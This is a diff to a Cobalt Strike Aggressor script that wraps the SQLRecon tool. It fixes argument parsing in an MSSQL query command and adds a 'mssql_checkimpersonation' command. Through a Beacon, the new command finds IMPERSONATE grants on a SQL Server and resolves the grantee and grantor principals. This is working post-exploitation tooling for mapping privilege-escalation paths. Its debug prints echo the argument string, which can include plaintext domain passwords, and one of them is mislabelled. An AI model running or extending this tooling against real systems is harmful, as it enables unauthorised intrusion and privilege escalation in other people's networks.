@@ -671,32 +671,40 @@ beacon_command_register(
 ## EXECUTE QUERIES
 alias mssql_query {
     $size       = size(@_);
-    $instance   = @_[1];
-    $domain     = @_[2];
-    $user       = @_[3];
-    $password   = @_[4];
-    $query      = @_[5];
-    println("mssql_query: " . $size . " - " . @_);
 
     $args = "";
     if ($size == 3)
     {
+        $instance   = @_[1];
+        $query      = @_[2];
+
         $args = "/a:wintoken /m:query "
         . " /h:" . $instance
         . " /c:\"" . $query . "\"";
+        println("mssql_checkimpersonation - args = " . $args);
+
     }
     else if ($size == 6)
     {
+        $instance   = @_[1];
+        $domain     = @_[2];
+        $user       = @_[3];
+        $password   = @_[4];
+        $query      = @_[5];
+
         $args = "/a:windomain /m:query"
         . " /h:" . $instance
         . " /d:" . $domain
         . " /u:" . $user
         . " /p:" . $password
         . " /c:\"" . $query . "\"";
+        println("mssql_checkimpersonation - args = " . $args);
+
     }
     else
     {
         berror($1, "Invalid parameters specified.");
+        return;
     }
     
     bexecute_assembly($1, $SQLRECON_PATH, $args );
@@ -707,4 +715,60 @@ beacon_command_register(
     "Usage:\n"
     . "mssql_accesstestuser [instance] [query]\n"
     . "mssql_accesstestuser [instance] [domain] [user] [password] [query]"
+);
+
+alias mssql_checkimpersonation {
+    $size = size(@_);
+
+    $query_imperonsate = "SELECT \* FROM sys.server_permissions WHERE permission_name = \'IMPERSONATE\'";
+
+    $args = "";
+    if ($size == 2)
+    {
+        $instance   = @_[1];
+
+        $args = "/a:wintoken /m:query "
+        . " /h:" . $instance;
+        # . " /c:\"" . $query_imperonsate . "\"";
+        println("mssql_checkimpersonation - args = " . $args);
+    }
+    else if ($size == 5)
+    {
+        $instance   = @_[1];
+        $domain     = @_[2];
+        $user       = @_[3];
+        $password   = @_[4];
+
+        $args = "/a:windomain /m:query"
+        . " /h:" . $instance
+        . " /d:" . $domain
+        . " /u:" . $user
+        . " /p:" . $password;
+        # . " /c:\"" . $query_imperonsate . "\"";
+        println("mssql_checkimpersonation - args = " . $args);
+    }
+    else
+    {
+        berror($1, "Invalid parameters specified.");
+        return;
+    }
+    
+    # bexecute_assembly($1, $SQLRECON_PATH, $args, $null, &mssql_checkimpersonation_cb);
+    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query_imperonsate . "\"", $null, lambda({ mssql_checkimpersonation_cb ($1, $2, $args); }));
+}
+sub mssql_checkimpersonation_cb {
+    blog($1, $2);
+    $regex = '\p{Digit}+ \| \w+ \| \p{Digit}+ \| \p{Digit}+ \| (\p{Digit}+) \| (\p{Digit}+)';
+    ($grantee, $grantor) = matches($2, $regex);
+    
+    $query = "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE principal_id =  $+ $grantor $+  OR principal_id =  $+ $grantee $+ ;";
+    bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query . "\"");
+
+}
+beacon_command_register(
+    "mssql_checkimpersonation",
+    "Use SQLRecon to run query to check impersonation",
+    "Usage:\n"
+    . "mssql_checkimpersonation [instance]\n"
+    . "mssql_checkimpersonation [instance] [domain] [user] [password]"
 );
